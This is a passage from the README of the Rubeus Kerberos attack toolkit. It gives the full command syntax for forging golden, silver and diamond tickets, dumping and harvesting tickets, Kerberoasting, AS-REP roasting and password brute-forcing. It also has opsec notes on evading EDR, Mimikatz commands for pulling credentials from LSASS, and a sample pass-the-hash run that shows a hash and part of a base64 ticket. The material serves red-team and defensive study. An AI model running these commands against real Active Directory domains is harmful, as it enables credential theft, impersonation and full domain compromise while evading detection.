[/extendedupndns] [/printcmd] [outfile:FILENAME] [/ptt]\r\n\r\n        Forge a golden ticket, setting values explicitly:\r\n            Rubeus.exe golden </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/oldpac] [/extendedupndns] [/printcmd] [outfile:FILENAME] [/ptt]\r\n\r\n        Forge a silver ticket using LDAP to gather the relevent information:\r\n            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]\r\n\r\n        Forge a silver ticket using LDAP to gather the relevent information, using the KRBTGT key to calculate the KDCChecksum and TicketChecksum:\r\n            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap </krbkey:HASH> [/krbenctype:DES|RC4|AES128|AES256] [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]\r\n\r\n        Forge a silver ticket using LDAP to gather the relevent information but explicitly overriding some values:\r\n            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/dc:DOMAIN_CONTROLLER] [/domain:DOMAIN] [/netbios:NETBIOS_DOMAIN] [/sid:DOMAIN_SID] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]\r\n\r\n        Forge a silver ticket using LDAP to gather the relevent information and including an S4U Delegation Info PAC section:\r\n            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/printcmd] [outfile:FILENAME] [/ptt]\r\n\r\n        Forge a silver ticket using LDAP to gather the relevent information and setting a different cname and crealm:\r\n            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> /ldap [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/printcmd] [outfile:FILENAME] [/ptt]\r\n\r\n        Forge a silver ticket, setting values explicitly:\r\n            Rubeus.exe silver </des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> </user:USERNAME> </service:SPN> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]\r\n\r\n\t\tForge a diamond TGT by requesting a TGT based on a user password/hash:\r\n\t\t\tRubeus.exe diamond /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/createnetonly:C:\\Windows\\System32\\cmd.exe] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]\r\n    \r\n\t\tForge a diamond TGT by requesting a TGT using a PCKS12 certificate:\r\n\t\t\tRubeus.exe diamond /user:USER /certificate:C:\\temp\\leaked.pfx </password:STOREPASSWORD> [/createnetonly:C:\\Windows\\System32\\cmd.exe] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]\r\n    \r\n\t\tForge a diamond TGT by requesting a TGT using tgtdeleg:\r\n\t\t\tRubeus.exe diamond /tgtdeleg [/createnetonly:C:\\Windows\\System32\\cmd.exe] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/krbkey:HASH] [/ticketuser:USERNAME] [/ticketuserid:USER_ID] [/groups:GROUP_IDS] [/sids:EXTRA_SIDS]\r\n\r\n\r\n     Ticket management:\r\n\r\n        Submit a TGT, optionally targeting a specific LUID (if elevated):\r\n            Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID]\r\n\r\n        Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated):\r\n            Rubeus.exe purge [/luid:LOGINID]\r\n\r\n        Parse and describe a ticket (service ticket or TGT):\r\n            Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI> [/servicekey:HASH] [/krbkey:HASH] [/asrepkey:HASH] [/serviceuser:USERNAME] [/servicedomain:DOMAIN] [/desplaintext:FIRSTBLOCKTEXT]\r\n\r\n\r\n     Ticket extraction and harvesting:\r\n\r\n        Triage all current tickets (if elevated, list for all users), optionally targeting a specific LUID, username, or service:\r\n            Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]\r\n\r\n        List all current tickets in detail (if elevated, list for all users), optionally targeting a specific LUID:\r\n            Rubeus.exe klist [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]\r\n\r\n        Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:\r\n            Rubeus.exe dump [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM] [/nowrap]\r\n\r\n        Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:\r\n            Rubeus.exe tgtdeleg [/target:SPN]\r\n\r\n        Monitor every /interval SECONDS (default 60) for new TGTs:\r\n            Rubeus.exe monitor [/interval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS]\r\n\r\n        Monitor every /monitorinterval SECONDS (default 60) for new TGTs, auto-renew TGTs, and display the working cache every /displayinterval SECONDS (default 1200):\r\n            Rubeus.exe harvest [/monitorinterval:SECONDS] [/displayinterval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME] [/runfor:SECONDS]\r\n\r\n\r\n     Roasting:\r\n\r\n        Perform Kerberoasting:\r\n            Rubeus.exe kerberoast [[/spn:\"blah/blah\"] | [/spns:C:\\temp\\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps] [/nowrap]\r\n\r\n        Perform Kerberoasting, outputting hashes to a file:\r\n            Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:\"blah/blah\"] | [/spns:C:\\temp\\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps]\r\n\r\n        Perform Kerberoasting, outputting hashes in the file output format, but to the console:\r\n            Rubeus.exe kerberoast /simple [[/spn:\"blah/blah\"] | [/spns:C:\\temp\\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps] [/nowrap]\r\n\r\n        Perform Kerberoasting with alternate credentials:\r\n            Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\\USER /credpassword:PASSWORD [/spn:\"blah/blah\"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps] [/nowrap]\r\n\r\n        Perform Kerberoasting with an existing TGT:\r\n            Rubeus.exe kerberoast </spn:\"blah/blah\" | /spns:C:\\temp\\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]\r\n\r\n        Perform Kerberoasting with an existing TGT using an enterprise principal:\r\n            Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]\r\n\r\n        Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:\r\n            Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/ldaps] [/nowrap]\r\n\r\n        Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:\r\n            Rubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]\r\n\r\n        Perform \"opsec\" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:\r\n            Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]\r\n\r\n        List statistics about found Kerberoastable accounts without actually sending ticket requests:\r\n            Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]\r\n\r\n        Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):\r\n            Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]\r\n\r\n        Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:\r\n            Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]\r\n\r\n        Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:\r\n            Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]\r\n\r\n        Perform AES Kerberoasting:\r\n            Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]\r\n\r\n        Perform Kerberoasting using an account without pre-auth by sending AS-REQ's:\r\n            Rubeus.exe kerberoast </spn:\"\"blah/blah\"\" | /spns:C:\\temp\\spns.txt> /nopreauth:USER /domain:DOMAIN [/dc:DOMAIN_CONTROLLER] [/nowrap]\r\n\r\n        Perform AS-REP \"roasting\" for any users without preauth:\r\n            Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps] [/des] [/nowrap]\r\n\r\n        Perform AS-REP \"roasting\" for any users without preauth, outputting Hashcat format to a file:\r\n            Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU=,...\"] [/ldaps] [/des]\r\n\r\n        Perform AS-REP \"roasting\" for any users without preauth using alternate credentials:\r\n            Rubeus.exe asreproast /creduser:DOMAIN.FQDN\\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:\"OU,...\"] [/ldaps] [/des] [/nowrap]\r\n\r\n\r\n     Miscellaneous:\r\n\r\n        Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:\r\n            Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" [/show] [/ticket:BASE64 | /ticket:FILE.KIRBI]\r\n\r\n        Reset a user's password from a supplied TGT (AoratoPw):\r\n            Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER] [/targetuser:DOMAIN\\USERNAME]\r\n\r\n        Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hashes:\r\n            Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN]\r\n\r\n        Substitute an sname or SPN into an existing service ticket:\r\n            Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:ldap [/srealm:DOMAIN] [/ptt] [/luid] [/nowrap]\r\n            Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:cifs/computer.domain.com [/srealm:DOMAIN] [/ptt] [/luid] [/nowrap]\r\n\r\n        Display the current user's LUID:\r\n            Rubeus.exe currentluid\r\n\r\n        Display information about the (current) or (target) logon session, default all readable:\r\n            Rubeus.exe logonsession [/current] [/luid:X]\r\n\r\n        The \"/consoleoutfile:C:\\FILE.txt\" argument redirects all console output to the file specified.\r\n\r\n        The \"/nowrap\" flag prevents any base64 ticket blobs from being column wrapped for any function.\r\n\r\n        The \"/debug\" flag outputs ASN.1 debugging information.\r\n\t\t\r\n        Convert an AS-REP and a key to a Kirbi:\r\n            Rubeus.exe asrep2kirbi /asrep:<BASE64 | FILEPATH> </key:BASE64 | /keyhex:HEXSTRING> [/enctype:DES|RC4|AES128|AES256] [/ptt] [/luid:X] [/nowrap]\r\n\r\n        Insert new DES session key into a Kirbi:\r\n            Rubeus.exe kirbi /kirbi:<BASE64 | FILEPATH> /sessionkey:SESSIONKEY /sessionetype:DES|RC4|AES128|AES256 [/ptt] [/luid:X] [outfile:FILENAME] [/nowrap]\r\n\r\n\r\n     NOTE: Base64 ticket blobs can be decoded with :\r\n\r\n        [IO.File]::WriteAllBytes(\"ticket.kirbi\", [Convert]::FromBase64String(\"aa...\"))\r\n\r\n\r\n### Opsec Notes\r\n\r\nThis section covers some notes on the operational security of using Rubeus in an environment, with some technical examples comparing/contrasting some of its approaches to Mimikatz. The material here will be expanded in the future.\r\n\r\n#### Overview\r\n\r\nAny action you perform on a system is a detectable risk, especially when abusing functionality in \"weird\"/unintended ways. Rubeus (like any attacker toolset) can be detected in a number of methods, either from the host, network, or domain perspectives. I have a workmate who is fond of stating _\"everything is stealthy until someone is looking for it\"_ - tools and techniques generally evade detection because either a) people are not sufficiently aware of the tool/technique and therefore not even looking, b) people can not collect and process the data needed at the appropriate scale, or c) the tool/technique blends with existing behavior to sufficiently sneak in with false positives in an environment. There is much more information on these steps and detection subversion in general in [Matt Graeber](https://twitter.com/mattifestation) and [Lee Christensen](https://twitter.com/tifkin_)’s Black Hat USA 2018 [“Subverting Sysmon”](https://i.blackhat.com/us-18/Wed-August-8/us-18-Graeber-Subverting-Sysmon-Application-Of-A-Formalized-Security-Product-Evasion-Methodology.pdf) talk and associated [whitepaper](https://specterops.io/assets/resources/Subverting_Sysmon.pdf).\r\n\r\nFrom the host perspective, Rubeus can be caught during initial [weaponization](#weaponization) of the code itself, by an abnormal (non-lsass.exe) process issuing raw Kerberos port 88 traffic, through the use of sensitive APIs like LsaCallAuthenticationPackage(), or by abnormal tickets being present on the host (e.g. rc4\\_hmac use in tickets in a modern environment).\r\n\r\nFrom a network or domain controller log perspective, since Rubeus implements many parts of the normal Kerberos protocol, the main detection method involves the use of rc4\\_hmac in Kerberos exchanges. Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges (with a few exceptions like inter-realm trust tickets). Using a rc4\\_hmac (NTLM) hash is used in a Kerberos exchange instead of a aes256\\_cts\\_hmac\\_sha1 (or aes128) key results in some signal that is detectable at the host level, network level (if Kerberos traffic is parsed), and domain controller event log level, sometimes known as \"encryption downgrade\".\r\n\r\n#### Weaponization\r\n\r\nOne common way attack tools are detected is through the weaponization vector for the code. If Rubeus is run [through PowerShell](#sidenote-running-rubeus-through-powershell) (this includes Empire) the standard PowerShell V5 protections all apply (deep script block logging, AMSI, etc.). If Rubeus is executed as a binary on disk, standard AV signature detection comes into play (part of why we [do not release](#compile-instructions) compiled versions of Rubeus, as brittle signatures are silly ; ). If Rubeus is used as a [library](#sidenote-building-rubeus-as-a-library) then it's susceptible to whatever method the primary tool uses to get running. And if Rubeus is run through unmanaged assembly execution (like Cobalt Strike's `execute_assembly`) cross-process code injection is performed and the CLR is loaded into a potentially non-.NET process, though this signal is present for the execution of any .NET code using this method.\r\n\r\nAlso, AMSI (the Antimalware Scan Interface) has been [added to .NET 4.8](https://blogs.msdn.microsoft.com/dotnet/2018/11/28/announcing-net-framework-4-8-early-access-build-3694/). [Ryan Cobb](https://twitter.com/cobbr_io) has additional details on the offensive implications of this in the **Defense** section of his [“Entering a Covenant: .NET Command and Control”](https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462) post.\r\n\r\n#### Example: Credential Extraction\r\n\r\nSay we have elevated access on a machine and want to extract user credentials for reuse.\r\n\r\nMimikatz is the swiss army knife of credential extraction, with multiple options. The `sekurlsa::logonpasswords` command will open up a [read handle to LSASS](https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L168), enumerate logon sessions present on the system, walk the default authentication packages for each logon session, and extract any reverseable password/credential material present. **Sidenote**: the `sekurlsa::ekeys` command will enumerate ALL key types present for the Kerberos package.\r\n\r\nRubeus doesn't have any code to touch LSASS (and none is intended), so its functionality is limited to extracting Kerberos tickets through use of the LsaCallAuthenticationPackage() API. From a non-elevated standpoint, the session keys for TGTs are not returned (by default) so only service tickets extracted will be usable (the **tgtdeleg** command uses a Kekeo trick to get a usable TGT for the current user). If in a high-integrity context, a [GetSystem](https://github.com/GhostPack/Rubeus/blob/4c9145752395d48a73faf326c4ae57d2c565be7f/Rubeus/lib/Helpers.cs#L55-L107) equivalent utilizing token duplication is run to elevate to SYSTEM, and a fake logon application is registered with the LsaRegisterLogonProcess() API call. This allows for privileged enumeration and extraction of all tickets currently registered with LSA on the system, resulting in base64 encoded .kirbi's being output for later reuse.\r\n\r\nMimikatz can perform the same base64 .kirbi extraction with the following series of commands:\r\n\r\n    mimikatz # privilege::debug\r\n    mimikatz # token::elevate\r\n    mimikatz # standard::base64 /output:true\r\n    mimikatz # kerberos::list /export\r\n\r\nMimikatz can also carve tickets directly out of LSASS' memory with:\r\n\r\n    mimikatz # privilege::debug\r\n    mimikatz # standard::base64 /output:true\r\n    mimikatz # sekurlsa::tickets /export\r\n\r\nAs \"everything is stealthy until someone is looking for it\", it's arguable whether LSASS manipulation or ticket extraction via the LsaCallAuthenticationPackage() API call is more \"stealthy\". Due to Mimikatz' popularity, opening up a handle to LSASS and reading/writing its memory has become a big target for EDR detection and/or prevention. However, LsaCallAuthenticationPackage() is used by a fairly limited set of processes, and creating a fake logon application with LsaRegisterLogonProcess() is also fairly anomalous behavior. However full API level introspection and baselining appears to be a more difficult technical problem than LSASS protection.\r\n\r\n#### Example: Over-pass-the-hash\r\n\r\nSay we recover a user's rc4\\_hmac hash (NTLM) and want to reuse this credential to compromise an additional machine where the user account has privileged access. \r\n\r\n**Sidenote:** pass-the-hash != over-pass-the-hash. The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn't touch Kerberos at all. The over-pass-the-hash approach was developed by [Benjamin Delpy](https://twitter.com/gentilkiwi) and [Skip Duckwall](https://twitter.com/passingthehash) (see their [\"Abusing Microsoft Kerberos - Sorry you guys don't get it\"](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18) presentation for more information). This approach turns a hash/key (rc4\\_hmac, aes256\\_cts\\_hmac\\_sha1, etc.) for a domain-joined user into a fully-fledged ticket-granting-ticket (TGT).\r\n\r\nLet's compare \"over-passing-the-hash\" via Mimikatz' `sekurlsa::pth` command verus using the `asktgt` command from Rubeus (or [Kekeo](https://github.com/gentilkiwi/kekeo/) if you'd like).\r\n\r\nWhen `sekurlsa::pth` is used to over-pass-the-hash, Mimikatz first creates a new [logon type 9 process](https://github.com/gentilkiwi/mimikatz/blob/3d8be22fff9f7222f9590aa007629e18300cf643/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L926) with dummy credentials - this creates a new \"sacrificial\" logon session that doesn't interact with the current logon session. It then opens the LSASS process with the ability to write to process memory, and the supplied hash/key is then [patched into the appropriate section](https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c#L566-L600) for the associated logon session (in this case, the \"sacrificial\" logon session that was started). This causes the normal Kerberos authentication process to kick off as normal as if the user had normally logged on, turning the supplied hash into a fully-fledged TGT.\r\n\r\nWhen Rubeus' `asktgt` command is run (or Kekeo's equivalent), the raw Kerberos protocol is used to request a TGT, which is then applied to the current logon session if the `/ptt` flag is passed.\r\n\r\nWith the Mimikatz approach, administrative rights are needed as you are manipulating LSASS memory directly. As previously mentioned, Mimikatz' popularity has also led to this type of behavior (opening up a handle to LSASS and reading/writing its memory) being a big target for EDR detection and/or prevention. With the Rubeus/Kekeo approach, administrative rights are not needed as LSASS is not being touched. However, if the ticket is applied to the current logon session (with `/ptt`), the TGT for the current logon session will be overwritten. This behavior can be avoided (with administrative access) by using the `/createnetonly` command to create a sacrificial process/logon session, then using `/ptt /ticket:X /luid:0xa..` with the newly created process LUID. If using Cobalt Strike, using the **make\\_token** command with dummy credentials and then **kerberos\\_ticket\\_use** with the ticket retrieved by Rubeus will let you apply the new TGT in a way that a) doesn't need administrative rights and b) doesn't stomp on the current logon session TGT.\r\n\r\nIt is our opinion that the LSASS manipulation approach is more likely (at the current moment) to be detected or mitigated due to the popularity of the technique. However the Rubeus approach does result in another piece of detectable behavior. Kerberos traffic to port 88 should normally only originate from lsass.exe - sending raw traffic of this type from an abnormal process could be detectable if the information can be gathered.\r\n\r\n**Sidenote**: one way _both_ approaches can potentially be caught is the previously mentioned \"encryption downgrade\" detection. To retrieve AES keys, use Mimikatz' `sekurlsa::ekeys` module to return ALL Kerberos encryption keys (same with `lsadump::dcsync`) which are better to use when trying to evade some detections.\r\n\r\n\r\n## Ticket requests and renewals\r\n\r\nBreakdown of the ticket request commands:\r\n\r\n| Command     | Description |\r\n| ----------- | ----------- |\r\n| [asktgt](#asktgt) | Request a ticket-granting-ticket (TGT) from a hash/key or password |\r\n| [asktgs](#asktgs) | Request a service ticket from a passed TGT |\r\n| [renew](#renew) | Renew (or autorenew) a TGT or service ticket |\r\n| [brute](#brute) | Perform a Kerberos-based password bruteforcing attack. 'spray' can also be used instead of 'brute' |\r\n| [preauthscan](#preauthscan) | Preform a scan for accounts that do not require Kerberos pre-authentication |\r\n\r\n\r\n### asktgt\r\n\r\nThe **asktgt** action will build raw AS-REQ (TGT request) traffic for the specified user and encryption key (`/rc4`, `/aes128`, `/aes256`, or `/des`). A `/password` flag can also be used instead of a hash - in this case `/enctype:X` will default to RC4 for the exchange, with `des|aes128|aes256` as options. If no `/domain` is specified, the computer's current domain is extracted, and if no `/dc` is specified the same is done for the system's current domain controller. If authentication is successful, the resulting AS-REP is parsed and the KRB-CRED (a .kirbi, which includes the user's TGT) is output as a base64 blob. The `/ptt` flag will \"pass-the-ticket\" and apply the resulting Kerberos credential to the current logon session. The `/luid:0xA..` flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.\r\n\r\nNote that no elevated privileges are needed on the host to request TGTs or apply them to the **current** logon session, just the correct hash for the target user. Also, another opsec note: only one TGT can be applied at a time to the current logon session, so the previous TGT is wiped when the new ticket is applied when using the `/ptt` option. A workaround is to use the `/createnetonly:C:\\X.exe` parameter (which hides the process by default unless the `/show` flag is specified), or request the ticket and apply it to another logon session with `ptt /luid:0xA..`.\r\n\r\nBy default, several differences exists between AS-REQ's generated by Rubeus and genuine AS-REQ's. To form AS-REQ's more inline with genuine requests, the `/opsec` flag can be used, this will send an initial AS-REQ without pre-authentication first, if this succeeds, the resulting AS-REP is decrypted and TGT return, otherwise an AS-REQ with pre-authentication is then sent. As this flag is intended to make Rubeus traffic more stealthy, it cannot by default be used with any encryption type other than `aes256` and will just throw a warning and exit if another encryption type is used. To allow for other encryption types to be used with the `/opsec` changes, the `/force` flag exists.\r\n\r\nPKINIT authentication is supported with the `/certificate:X` argument. When the private key within the PFX file is password protected, this password can be passed with the `/password:X` argument. When using PKINIT authentication the `/getcredentials` flag can be used to automatically request a U2U service ticket and retrieve the account NT hash.\r\n\r\nRequesting a TGT without a PAC can be done using the `/nopac` switch.\r\n\r\nUsing a KDC proxy ([MS-KKDCP](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kkdcp/5bcebb8d-b747-4ee5-9453-428aec1c5c38)) to make the request is possible using the `/proxyurl:URL` argument. The full URL for the KDC proxy is required, eg. https://kdcproxy.exmaple.com/kdcproxy\r\n\r\nThe `/nopreauth` flag can be used to send an AS-REQ without pre-authentication. The `/service:SPN` argument can be used to request service tickets using AS-REQ's directly, it will take an SPN or a username.\r\n\r\nRequesting a ticket via RC4 hash for **dfm.a@testlab.local**, applying it to the current logon session:\r\n\r\n    C:\\Rubeus>Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.4.1\r\n\r\n    [*] Action: Ask TGT\r\n\r\n    [*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\\dfm.a'\r\n    [+] TGT request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIFmjCCBZagAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoQ8bDVRFU1RMQUIuTE9DQUyiIjAg\r\n        oAMCAQKhGTAXGwZrcmJ0Z3QbDXRlc3RsYWIubG9jYWyjggRlMIIEYaADAgESoQMCAQKiggRTBIIETwrl\r\n        zIpKjTT11eteJCn+0rtlKwtTW/8XvoWXy61rOCrOIo16YPiMe4usXoJaOqsvCydMgd6955hT+IoFMyGG\r\n        VfVxetoM1Oa5aPA2sfzJeogn4RpFBoY5vjjKBzPaTJptPRX7Wjg0o1FTszJET4mhQyLKxQMgprKcc2mz\r\n        yniQzGPI19O95aSoPpNar+4lKlyBsL4QjSEeBdZQ2/Ab1JVu3eh1xCsWkKUUlabbzeZwo8SG0QkZ0DKk\r\n        qOD8hx5wbQ+w8emcLvHMIrmg1xO2OPngK76C3daeiS59UVADSz/n3H7Tfuk+EXSdZ8DC4/c8KIZvHsC6\r\n        cO/ymVFxyuRJLg7VThl8keZmbWzYei6xAwH7mUAUEA1lk0pEHx12nAHcKILsbS3F9wAcHMNEGe/Xa3UK\r\n        INJ0q+JvdJpCPo/wgyu7wjKgsdpgUV0siVfpGaxG7yh6s3U2tAlBWnWdGF/Gy/FkOk/hJxhTTHcHa5XE\r\n        LTaXY9cnraee+llJqmOnHfjPa5+XNTnVtBZjT0SPRnSXfdPG5BgiXYlCjr5ykhF8MdVE1Se+WtEZJuPj\r\n        